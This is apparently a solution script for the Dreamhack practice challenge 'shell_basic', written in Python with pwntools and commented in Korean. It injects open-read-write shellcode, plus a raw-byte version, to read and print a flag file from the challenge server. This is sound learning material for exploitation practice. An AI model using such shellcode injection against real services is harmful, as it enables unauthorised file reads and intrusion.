from pwn import *

context.arch = 'amd64'

p = remote("host3.dreamhack.games", 21221)

#pwntool 사용한 방법

path = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(path)                   # open("/home/shell_basic/flag_name_is_loooooong")
                                                    # open() 함수 결과는 rax 레지스터에 저장된다. → fd = rax
shellcode += shellcraft.read('rax', 'rsp', 0x30)    # read(fd, buf, 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)       # write(stdout, buf, 0x30)
shellcode = asm(shellcode)                          # shellcode를 기계어로 변환

#print("shellcode: ", shellcode)

p.sendlineafter("shellcode: ", shellcode)

print(p.recv(0x30))

# orw에서 objdump 사용하여 shellcode 값 생성 후 pwntool로 넘겨서 작성

#shellcode = b"\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\x48\xc7\xc2\x30\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05"

#p.sendlineafter('shellcode: ', shellcode)
#print(p.recv())

#6a00 48b8 6f6f 6f6f 6f6f 6e67 5048 b861 6d65 5f69 735f 6c50 48b8 632f 666c 6167 5f6e 5048 b865 6c6c 5f62 6173 6950 48b8 2f68 6f6d 652f 7368 5048 89e7 4831 f648 31d2 b802 0000 000f 0548 89c7 4889 e648 83ee 30ba 3000 0000 b800 0000 000f 05bf 0100 0000 b801 0000 000f 0548 31ff b83c 0000 000f 05